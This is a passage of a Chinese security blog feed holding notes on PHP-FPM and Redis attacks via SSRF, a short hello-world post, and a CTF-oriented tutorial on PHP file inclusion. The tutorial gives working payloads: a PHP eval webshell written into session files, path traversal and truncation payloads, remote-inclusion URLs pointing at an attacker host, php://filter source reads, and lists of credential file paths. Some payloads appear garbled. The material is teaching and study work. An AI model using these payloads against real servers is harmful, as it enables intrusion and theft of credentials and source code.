alt="image-20220702173235441"></p><p>常见的方式就是直接使用<code>PHP_ADMIN_VALUE</code>进行设置，然后就能通过php:&#x2F;&#x2F;input伪协议来进行任意代码执行。同时也可以根据需要，开启相应的<strong>远程文件包含设置</strong>。</p><h6 id="PHP-FPM未授权访问漏洞："><a href="#PHP-FPM未授权访问漏洞：" class="headerlink" title="PHP-FPM未授权访问漏洞："></a>PHP-FPM未授权访问漏洞：</h6><p>因为可以通过<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>这两个环境变量对PHP配置进行设置，所以攻击者可以通过<code>PHP-FPM</code>执行任意代码，实现代码执行漏洞。</p><p>初次之外，因为PHP-FPM和Web服务器中间件是通过网络进行沟通的，所以会有越来越多的集群将PHP-FPM直接绑定在公网上，所有人都可以对起进行访问，也就是说，任何人都可以伪装成Web服务器中间件来让PHP-FPM执行我们想要执行的恶意代码。这就会造成PHP-FPM的未授权访问漏洞。</p><p>（简单来说，就是可以通过伪装成Web服务器的方式，来对PHP-FPM发送数据，以执行需要的代码，或者是访问需要的网页，前提是PHP-FPM这个组件在公网，可以直接进行访问）</p><h6 id="SSRF中对于FPM-x2F-FastCGI的攻击："><a href="#SSRF中对于FPM-x2F-FastCGI的攻击：" class="headerlink" title="SSRF中对于FPM&#x2F;FastCGI的攻击："></a>SSRF中对于FPM&#x2F;FastCGI的攻击：</h6><p>可以看见的是，因为上述攻击中，要求我们可以从公网访问到PHP-FPM，如果不是公网，而是内网访问的话，就不能直接发包。<strong>要进行攻击的话，就需要从内网进行攻击，例如使用SSRF来进行反打。</strong></p><p>只要可以调用相关的函数，就可以通过url进行payload的传输，然后就能进行攻击。</p><h6 id="这篇总结相当好"><a href="#这篇总结相当好" class="headerlink" title="这篇总结相当好"></a>这篇总结相当好</h6><blockquote><p><a href="https://copyfuture.com/blogs-details/20210624174402663W">https://copyfuture.com/blogs-details/20210624174402663W</a></p></blockquote><h4 id="Redis协议（RESP协议）："><a href="#Redis协议（RESP协议）：" class="headerlink" title="Redis协议（RESP协议）："></a>Redis协议（RESP协议）：</h4><blockquote><p>应用系统和Redis之间通过Redis协议（RESP）进行交互。</p><p><strong>请求响应模式</strong></p><p>Redis协议使用TCP，也就是客户端和Redis之间保持双工的连接。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220704205113835.png" alt="image-20220704205113835"></p><p>也就是说，Redis协议就是专门用于客户端和Redis之间交互的协议。那么什么是Redis呢？</p><p><strong>Redis：</strong></p><p>REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是<strong>跨平台的非关系型数据库</strong>。</p><p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、<strong>可选持久性的键值对(Key-Value)存储数据库</strong>，并提供多种语言的 API。</p><p><strong>Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。</strong></p><p>Redis是完全开源的，遵守BSD协议，是一个高性能的key-value数据库，相较于其他的key-value缓存产品，主要有三个特点：</p><ul><li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li><li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li><li>Redis支持数据的备份，即master-slave模式的数据备份。</li></ul><p>Redis的优势：</p><ul><li>性能极高 – Redis能读的速度是110000次&#x2F;s,写的速度是81000次&#x2F;s 。</li><li>丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。</li><li>原子 – Redis的所有操作都是原子性的，意思就是要么成功执行要么失败完全不执行。单个操作是原子性的。多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来。</li><li>丰富的特性 – Redis还支持 publish&#x2F;subscribe, 通知, key 过期等等特性。</li></ul><p>Redis和其他的key-value存储有什么不同：</p><ul><li>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</li><li>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</li></ul></blockquote><p><strong>常见的漏洞使用方式：</strong></p><h5 id="Redis未授权访问："><a href="#Redis未授权访问：" class="headerlink" title="Redis未授权访问："></a>Redis未授权访问：</h5><blockquote><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip访问等，这样将会将 Redis服务暴露到公网上。</p><p>如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取Redis 的数据。 </p></blockquote><p>也就是当Redis直接被绑定在公网的时候，可以直接伪造请求，然后对<code>Redis</code>直接进行访问，执行相关的指令。</p><p><strong>漏洞危害：</strong></p><blockquote><p>（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，也可以恶意执行flushall来清空所有数据<br>（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>（3）如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</p></blockquote><p><strong>Redis常见命令：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705140318215.png" alt="image-20220705140318215"></p><p>那么相关的使用方式，就是当<code>Redis</code>没有被暴露在公网的情况下，使用<code>SSRF</code>从内网进行攻击反打。</p><h5 id="SSRF利用Redis协议方式："><a href="#SSRF利用Redis协议方式：" class="headerlink" title="SSRF利用Redis协议方式："></a>SSRF利用Redis协议方式：</h5><blockquote><p>redis客户端与服务端通信，使用RESP（REdis Serialization Protocal，redis序列化协议）协议通信，该协议是专门为redis设计的通信协议，但也可以用于其它客户端-服务器通信的场景。</p><p>RESP可以用于序列化不同的数据类型，如：整型、字符串、数组…并且为错误提供专门的类型；客户端发送请求时，以字符串数组的作为待执行命令的参数。redis服务器根据不同的命令返回不同的数据类型。 </p><p>RESP协议支持五种数据类型：<br>1、简单字符串（Simple Strings）<br>2、错误数据（Errors）<br>3、整数（Integers）<br>4、批量字符串（Bulk Strings）<br>5、数组（Arrays）</p><p>当客户端请求服务器的时候，会以批量数据类型的数组请求封装。当服务端发送响应给客户端的时候，根据命令实现的不同，返回响应的数据类型。</p><p>不同的数据类型是根据请求&#x2F;响应报文的第一个字节进行区分的：</p><ul><li>简单字符串以+开头</li><li>错误数据以-开头</li><li>整数以:开头</li><li>批量字符串以$开头</li><li>数组以*开头</li></ul><p>RESP协议发不同部分，使用<code>\r\n</code>（CRLF）进行分隔。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705142938907.png" alt="image-20220705142938907"></p><p>类似上面的数据类型，因为是建立在TCP层，因此可以使用wireshark进行抓包分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705143132813.png" alt="image-20220705143132813"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello,World!</title>
      <link href="/2022/06/15/hello/"/>
      <url>/2022/06/15/hello/</url>
      
        <content type="html"><![CDATA[<p>很高兴，终于把博客搭建好了。</p><p>之前为了搭建这个玩意我来来回回折腾了好久。最开始是使用的NEXT主题，结果遇到了一堆问题。而且node.js也在疯狂的爆出各种错误。然后github也没办法使用hexo d去进行文章推送。</p><p>从一开始到现在，差不多算是折腾了一个星期吧（省去中间的相隔的时间）</p><p>啥时候有时间我再写一篇博客搭建记录。</p><p>不过现在嘛，还是只能说很高兴吧，最开始的时候一直是使用CSDN博客进行凑数的。</p><p>经过了一年的学习，对于信息安全也越发的热爱了，终于想起来要搭建一个个人博客。</p><p>那句话怎么说的来着？生活要有仪式感？</p><p>哈。</p><p>这个就算是我的仪式感吧。</p><p>以后我会尽量把我自己的学习记录到博客上，然后对于我自己看一些东西，我也会自己写一些书评，基本还是给自己一个记录吧。</p><p>可能还会给自己写一些日记之类的，到时候加一个加密功能。</p><p>嗯，差不多就记录到这里。</p>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9A/"/>
      <url>/2022/06/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞："><a href="#文件包含漏洞：" class="headerlink" title="文件包含漏洞："></a>文件包含漏洞：</h1><p><strong>前言</strong>：</p><p>关于文件包含漏洞，我一直都没有进行一个比较系统的总结，现在我就对基于PHP语言下的文件包含漏洞进行对包含原理的笔记。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>这个漏洞出现的原理，主要和现在一般采用的模块化工作方式有关系。为了保证开发的效率以及后期改正的情况，程序工作者往往采用模块化的方式对程序进行一个编写，这样在后期出现问题的时候，就可以直接对模块进行维修，而不用对所有代码进行重新审计。这样就保证了代码的简洁性。</p><p>基于以上原理，在对于模块化的代码文件进行引用的时候，会需要使用一些特定的函数对文件进行一个“包含”。同时，为了保证程序的灵活性，进行包含的文件往往都会是一个可变的参数。</p><p>这就给黑客的攻击提供了空间。</p><p>黑客攻击往往会对包含的文件进行修改，使得被包含的文件内容超出程序编写者的预想，而导致出现风险。</p><h2 id="文件包含函数（PHP）"><a href="#文件包含函数（PHP）" class="headerlink" title="文件包含函数（PHP）:"></a>文件包含函数（PHP）:</h2><p>在PHP中，有四种函数可以使用文件包含的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><p>这里我们可以通过手册来查询一下这几个函数的作用：</p><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p>首先是include()，手册中是这么写的：<code>include</code> 表达式包含并运行指定文件。 </p><p>这一点也同时适用于require()函数。</p><p>这两个函数的主要区别只是在于，include()函数在运行时，如果出错了，会只是产生一个warning，然后继续运行后面的脚本。</p><p>但是require()函数在出错的时候，会直接产生一个**<code>E_COMPILE_ERROR</code>的错误，导致程序直接停止运行。</p><p>而剩下的两个函数，include_once()于require_once()和上面的函数基本相同，只是它们只会对同一个文件进行一次包含。因此，常用于for、while这种循环中。</p><h2 id="文件包含漏洞常常出现的作用："><a href="#文件包含漏洞常常出现的作用：" class="headerlink" title="文件包含漏洞常常出现的作用："></a>文件包含漏洞常常出现的作用：</h2><h3 id="1、本地文件包含："><a href="#1、本地文件包含：" class="headerlink" title="1、本地文件包含："></a>1、本地文件包含：</h3><p>这个漏洞的攻击方式通常需要配合目录穿越漏洞进行一同操作。</p><p>通过..&#x2F;来进行本地文件的读取，通过修改文件路径来改变对文件的包含，以此获取一些隐私的信息，或是flag。</p><p>常见敏感路径：</p><p><strong>windows:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure><p><strong>Linux:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure><p>这里可以通过对于文件路径的推测来进行对于文件的读取。 </p><h4 id="session文件包含漏洞："><a href="#session文件包含漏洞：" class="headerlink" title="session文件包含漏洞："></a>session文件包含漏洞：</h4><p>这个漏洞属于是文件包含漏洞的二次衍生漏洞。</p><p>首先是关于session文件的说明:</p><p>session文件，基本上可以理解为是一个临时的，存放在服务器端的容器，当用户没有关闭浏览器之前，其中的东西都是存在的。这个容器一般用于存储用户的一些信息。当用户进行访问的时候，服务器会为每个用户分配唯一的session。</p><p>这个文件和cookie不一样的地方就是，这个文件都是存储在服务器上的，而cookie文件是存储在用户的主机上的。</p><p>本质上，采用session是为了对用户的浏览状态进行一个保留，当在同一域名中切换时，可以对用户当前的状态进行保留，同时可以避免用户更改cookie文件导致出现不必要的危险。</p><hr><p>对于session的存储位置，一般可以直接通过phpinfo()去获取，通过直接查看phpinfo()中session.save_path的部分，就可以看见对应的路径。</p><p>一般来说，在Linux系统中，会默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session的目录下面。</p><p>而在windows系统中，默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里</p><p>可以通过代码对session中的内容进行控制，传入恶意代码。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过这个例子来看一下用来控制session文件的代码。</p><p>首先是来看一下session_start()这个函数的作用，在官方文档（<a href="https://www.php.net/manual/zh/function.session-start.php%EF%BC%89%E4%B8%AD%E5%86%99%E9%81%93%EF%BC%9A">https://www.php.net/manual/zh/function.session-start.php）中写道：</a></p><blockquote><p>   <strong>session_start()</strong> 会创建新会话或者重用现有会话。   如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID，   则会重用现有会话。  </p><p>   当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候，   PHP 内部会调用会话管理器的 open 和 read 回调函数。   会话管理器可能是 PHP 默认的，   也可能是扩展提供的（SQLite 或者 Memcached 扩展），   也可能是通过 <a href="https://www.php.net/manual/zh/function.session-set-save-handler.php">session_set_save_handler()</a> 设定的用户自定义会话管理器。   通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），   PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。  </p></blockquote><p>这里可以看出来，如果要创建一个session文件，就要首先用这个函数进行一个类似于初始化的操作（即是之前写的创建新会话或重用现有会话）</p><p>然后对代码后面进行分析：</p><p>将一个值通过get方式进行传参，然后使用创建一个超全局变量，将其值赋为传入的参数。</p><p><strong>通常，在PHP脚本结束的时候，会将未被销毁的session变量保存在服务器的一个路径文件下</strong></p><p>也就是在执行完以上的代码之后，将get获取的变量存入到session文件中。</p><p>这时我们可以知道的是，session文件名会被命名为sess_+sessionid的格式。</p><p>sessionid被存放在服务器内存和客户机的cookie里面，可以通过开发者模式看见。</p><p>这就可以发现一个问题，因为没有对传入的ctfs这个参数进行过滤，所以会导致可以传入小马进行getshell。</p><p>例如直接将传入的值改为 <?php @eval($_POST['hacker']); ?>，恶意代码就会被保存至服务器文件中，此时如果存在文件包含漏洞，就可以将session文件进行包含解析为php内容。</p><p>导致getshell。</p><h3 id="2、有限制本地文件包含漏洞："><a href="#2、有限制本地文件包含漏洞：" class="headerlink" title="2、有限制本地文件包含漏洞："></a>2、有限制本地文件包含漏洞：</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断:"></a>%00截断:</h4><p>这里需要使用到PHP的一个版本漏洞，即文件名的%00截断：</p><p>条件：1、magic_quotes_gpc &#x3D; Off   2、php版本&lt;5.3.4</p><p>通常采用的绕过方式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure><p>代码分析：</p><p>这个代码很简单，可以看见的是，$filename变量被通过get方式传入一个值，然后通过与.html进行拼接后，形成需要被包含的文件名。</p><p>因此，当传入构建的payload的时候，会在检测到boot.ini%00的时候被截断，就将包含的文件变为了boot.ini。</p><h4 id="路径长度截断："><a href="#路径长度截断：" class="headerlink" title="路径长度截断："></a>路径长度截断：</h4><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p><p>这里是利用的两种操作系统下的目录长度限制。</p><blockquote><p>Windows下目录最大长度为256个字节</p><p>Linux下目录最大长度为4096个字节</p></blockquote><p>超过目录最大长度的时候，超出的部分会被丢弃。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码解释和之前一样</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan><br></pre></td></tr></table></figure><p>原理：</p><p>这里是通过使用文件路径中的.&#x2F;表示本文件，来创造垃圾字段长度，来对后面.html文件后缀进行截断。</p><h4 id="点截断："><a href="#点截断：" class="headerlink" title="点截断："></a>点截断：</h4><p>基本原理类似于长度截断，直接放payload了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txtspan><br></pre></td></tr></table></figure><p>点符号超过256字节即可在windows系统下进行截断。</p><h3 id="3、远程文件包含漏洞"><a href="#3、远程文件包含漏洞" class="headerlink" title="3、远程文件包含漏洞:"></a>3、远程文件包含漏洞:</h3><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><blockquote><p>allow_url_fopen配置作用：该配置设置为off的时候，用户将不能通过url打开文件。</p><p>allow_url_include配置作用：当该配置被设置为了off的时候，访问者将不能包含本网站之外的文件。</p></blockquote><p>通过对于上面两个的配置了解，应该就大概能知道为什么会导致远程文件包含漏洞的产生。</p><p><strong>从PHP5.2开始，allow_url_include()就被默认为是关闭的了，而allow_url_fopen却始终是开启的。</strong></p><h4 id="1、无限制远程文件包含漏洞："><a href="#1、无限制远程文件包含漏洞：" class="headerlink" title="1、无限制远程文件包含漏洞："></a>1、无限制远程文件包含漏洞：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</span><br></pre></td></tr></table></figure><p>解释一下上述payload:</p><p>这里是通过get方式将一个文件对于的url链接作为文件名传入了进去，再对不在自己服务器上的文件进行了一个包含文件。</p><p>然后.txt文件中的PHP探针被执行，成功的getshell。</p><h4 id="有限制远程文件包含漏洞绕过思路："><a href="#有限制远程文件包含漏洞绕过思路：" class="headerlink" title="有限制远程文件包含漏洞绕过思路："></a>有限制远程文件包含漏洞绕过思路：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单的参考代码。</p><p>分析：当尝试通过远程文件包含的时候，会在文件的后缀处拼接一个.html，导致文件的后缀出现改变。</p><p>这里列出比较常见的几种绕过方式：</p><h5 id="1、问号绕过："><a href="#1、问号绕过：" class="headerlink" title="1、问号绕过："></a>1、问号绕过：</h5><p>这种绕过的方式比较简单，就是在文件对应的url链接部分的后面加上一个?就可以了，这样就会出现一个截断的效果。</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure><h5 id="2、-号绕过："><a href="#2、-号绕过：" class="headerlink" title="2、#号绕过："></a>2、#号绕过：</h5><p>同上，但是要注意对#号进行url编码：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt&amp;23</span><br></pre></td></tr></table></figure><p>这里的%23就是#的url编码格式。</p><h5 id="3、空格绕过："><a href="#3、空格绕过：" class="headerlink" title="3、空格绕过："></a>3、空格绕过：</h5><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</span><br></pre></td></tr></table></figure><p>同上，这里要对空格进行url编码，变成%20。</p><h3 id="4、PHP伪协议："><a href="#4、PHP伪协议：" class="headerlink" title="4、PHP伪协议："></a>4、PHP伪协议：</h3><p>这里是比较重要的地方，主要是对php伪协议的了解。</p><p>这里首先放一个师傅的文章<a href="https://arg1nt.gitee.io/2021/03/undefined/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/">https://arg1nt.gitee.io/2021/03/undefined/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/</a></p><p>这是一篇比较实用的总结。</p><p>要进行对PHP伪协议的学习，首先要对伪协议有一个了解，这里我把PHP使用手册贴上来，看到这里的大家可以去翻阅一下。</p><p><strong><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></strong></p><p>一般来说主要会遇到的PHP伪协议有这样几种：</p><p>file:&#x2F;&#x2F;</p><p>php:&#x2F;&#x2F;</p><p>phar:&#x2F;&#x2F;</p><p>zlib:&#x2F;&#x2F;</p><p>对于开始学PHP伪协议的人，我建议还是首先答题的了解一下伪协议的效果以及作用能力。</p><p>可以考虑参考一下这一个文章：<a href="https://m.php.cn/article/430458.html">https://m.php.cn/article/430458.html</a></p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20211120170350098.png" alt="image-20211120170350098"></p><p>测试用代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F-伪协议："><a href="#php-x2F-x2F-伪协议：" class="headerlink" title="php:&#x2F;&#x2F;伪协议："></a>php:&#x2F;&#x2F;伪协议：</h4><p>按照上面的图片可知，php:&#x2F;&#x2F;协议主要是用于提供访问输入&#x2F;输出流的方法，同时也将会允许访问PHP的错误描述符，内存、磁盘备份的临时文件流，以及可以操作其他读写文件资源的过滤器。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211120171938072.png" alt="image-20211120171938072"></p><p>对于php:&#x2F;&#x2F; 这个协议来说，是支持多种的过滤器嵌套的，也就是可以使用多个过滤器。</p><h5 id="php-x2F-x2F-filter（本地磁盘文件读取）"><a href="#php-x2F-x2F-filter（本地磁盘文件读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（本地磁盘文件读取）"></a>php:&#x2F;&#x2F;filter（本地磁盘文件读取）</h5><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211120194724327.png" alt="image-20211120194724327"></p><p>这个伪协议是一个元封装器，设计着用于数据流打开的时候，“筛选过滤“应用，可以对本地磁盘文件进行读写。</p><p>简单来说就是可以用于读取文件源代码，一般在知道网站路径的情况下使用。</p><p><strong>比较特殊的地方是，filter再两个设置都是off的时候还是可以使用。</strong></p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/resource=[文件名]</span><br><span class="line">eg:</span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/resource=phpinfo.txt</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=xxx.php ?</span><br></pre></td></tr></table></figure><p>通过以上payload可以对文件进行一个读取。（针对php文件会需要使用base64编码进行输出，否则会直接将源代码当作PHP代码执行，会看不见内容）</p><p>此时返回的将是对应.php文件的base64加密后的代码内容。<strong>对于不在同一目录下的文件，需要写好相对路径</strong></p><p>无论是post还是get方式都可以使用。</p><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><p>这里引用以下php手册中的描述：</p><blockquote><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。    POST 请求的情况下，最好使用 php:&#x2F;&#x2F;input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。    而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，    比激活 <code>always_populate_raw_post_data</code>    潜在需要更少的内存。    <code>enctype=&quot;multipart/form-data&quot;</code> 的时候    php:&#x2F;&#x2F;input 是无效的。   </p></blockquote><p>allow_url_fopen和allow_url_include这两个参数都要处于打开的状态。但是使用enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效的。</p><p>具体的效果就是可以将POST请求中的数据作为PHP代码来执行，但是需要使用include()函数进行来打开。</p><p>主要做法是将GET部分修改为php:&#x2F;&#x2F;input，然后POST部分修改为想要传输的PHP代码。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/2018060617565626" alt="img"></p><h4 id="file-x2F-x2F-伪协议："><a href="#file-x2F-x2F-伪协议：" class="headerlink" title="file:&#x2F;&#x2F;伪协议："></a>file:&#x2F;&#x2F;伪协议：</h4><p>通过file协议可以访问到本地文件系统，同时可以读取到文件的内容。</p><p>引用PHP手册：</p><blockquote><p>   <em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。   当指定了一个相对路径（不以&#x2F;、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。   在很多情况下是脚本所在的目录，除非被修改了。   使用 CLI 的时候，目录默认是脚本被调用时所在的目录。  </p><p>   在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>，   <code>include_path</code> 会可选地搜索，也作为相对的路径。  </p></blockquote><p>这个协议本身不受allow_url_fopen和allow_url_include这两个参数的影响。 </p><p><strong>同时，传入的文件路径只能是绝对路径。</strong></p><h4 id="data-x2F-x2F-伪协议："><a href="#data-x2F-x2F-伪协议：" class="headerlink" title="data:&#x2F;&#x2F;伪协议："></a>data:&#x2F;&#x2F;伪协议：</h4><blockquote><p>自 PHP 5.2.0 起 data:（<a href="http://www.faqs.org/rfcs/rfc2397">» RFC    2397</a>）数据流封装器开始有效。  </p></blockquote><p>数据流封装器，和php:&#x2F;&#x2F;相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p><p><strong>也就是相当于是一个命令执行的语句，通过url进行传入</strong></p><p>需要allow_url_include，allow_url_fopen两个配置参数on。</p><p>类似于php:&#x2F;&#x2F;input， 可用于file_get_contents()绕过。</p><p><img 